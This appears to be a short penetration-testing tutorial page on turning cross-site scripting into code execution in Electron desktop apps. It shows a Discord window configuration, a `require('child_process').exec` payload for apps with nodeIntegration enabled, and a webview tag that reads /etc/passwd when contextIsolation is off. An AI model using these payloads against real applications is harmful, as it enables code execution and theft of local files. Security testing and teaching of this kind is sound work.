# XSS to RCE Electron Desktop Apps

Recommended read for more trick: [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

When I test Electron app, first I always check the options of the [BrowserWindow API](https://www.electronjs.org/docs/api/browser-window), which is used to create a browser window. By checking it, I think about how RCE can be achieved when arbitrary JavaScript execution on the renderer is possible.  
Example:

```text
const mainWindowOptions = {
  title: 'Discord',
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true
  }
};
```

## nodeIntgration RCE

If the nodeIntegration is set to true, a web page's JavaScript can use Node.js features easily just by calling the `require()`. For example, the way to execute the calc application on Windows is:

```text
<script>
  require('child_process').exec('calc');
</script>
```

## Read Arbitrary Internal FIle

If contextIsolation set to false you can try to use &lt;webview&gt; \(similar to &lt;iframe&gt; butcan load local files\) to read local files and exfiltrate them: using something like  **&lt;webview src=”file:///etc/passwd”&gt;&lt;/webview&gt;:**

![](../../.gitbook/assets/1-u1jdryuwaevwjmf_f2ttjg.png)

**\(Trick copied form** [**here**](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)**\).**

